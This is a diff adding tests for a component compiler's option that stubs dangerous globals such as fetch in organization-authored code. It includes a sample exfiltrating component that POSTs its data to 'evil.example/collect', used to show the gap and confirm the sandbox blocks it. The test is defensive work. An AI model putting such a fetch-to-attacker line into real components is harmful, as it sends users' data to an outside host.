@@ -303,3 +303,92 @@ describe("author-local import names", () => {
     ).not.toThrow();
   });
 });
+
+/**
+ * Q82 / B-17 — the runtime half of the source gate. An organization-authored
+ * component compiled with `sandboxDangerousGlobals` must throw a NAMED error
+ * when it reaches for the network or the evaluator, while an identical
+ * component doing honest work still renders.
+ */
+describe("compileSlotComponent — dangerous-global stubs", () => {
+  const EXFILTRATING = `
+    export default function Exfiltrate({ data }) {
+      fetch("https://evil.example/collect", {
+        method: "POST",
+        body: JSON.stringify(data),
+      });
+      return <div>ok</div>;
+    }
+  `;
+
+  it("lets the exfiltrating component run when the stubs are OFF (today's scope)", () => {
+    const result = compileSlotComponent({
+      code: EXFILTRATING,
+      allowedImports: ["react"],
+    });
+    expect(result.error).toBeNull();
+    expect(result.Component).not.toBeNull();
+    // Proof the hole is real: the compiled body's `fetch` is the page's own.
+    const calls: string[] = [];
+    const realFetch = globalThis.fetch;
+    // @ts-expect-error — deliberately replacing the global for one assertion.
+    globalThis.fetch = (url: string) => {
+      calls.push(String(url));
+      return Promise.resolve(undefined as never);
+    };
+    try {
+      renderToStaticMarkup(createElement(result.Component!, { data: { a: 1 } }));
+    } finally {
+      globalThis.fetch = realFetch;
+    }
+    expect(calls).toEqual(["https://evil.example/collect"]);
+  });
+
+  it("throws a named error when the stubs are ON", () => {
+    const result = compileSlotComponent({
+      code: EXFILTRATING,
+      allowedImports: ["react"],
+      sandboxDangerousGlobals: true,
+    });
+    expect(result.error).toBeNull();
+    expect(() =>
+      renderToStaticMarkup(createElement(result.Component!, { data: { a: 1 } })),
+    ).toThrow(/This component tried to use "fetch"/);
+  });
+
+  it("still renders an honest component with the stubs ON", () => {
+    const result = compileSlotComponent({
+      code: `
+        import { Card } from "@/components/ui/card";
+        export default function Honest({ data }) {
+          return <Card data-title={String(data?.title ?? "")}>rendered</Card>;
+        }
+      `,
+      allowedImports: ["react", "@/components/ui/card"],
+      sandboxDangerousGlobals: true,
+    });
+    expect(result.error).toBeNull();
+    const markup = renderToStaticMarkup(
+      createElement(result.Component!, { data: { title: "hello" } }),
+    );
+    expect(markup).toContain("rendered");
+    expect(markup).toContain('data-title="hello"');
+  });
+
+  it("does not steal a name the author declared themselves", () => {
+    const result = compileSlotComponent({
+      code: `
+        const localStorage = { getItem: () => "author-owned" };
+        export default function Shadowed({ data }) {
+          return <div>{localStorage.getItem("k")}</div>;
+        }
+      `,
+      allowedImports: ["react"],
+      sandboxDangerousGlobals: true,
+    });
+    expect(result.error).toBeNull();
+    expect(
+      renderToStaticMarkup(createElement(result.Component!, { data: {} })),
+    ).toContain("author-owned");
+  });
+});
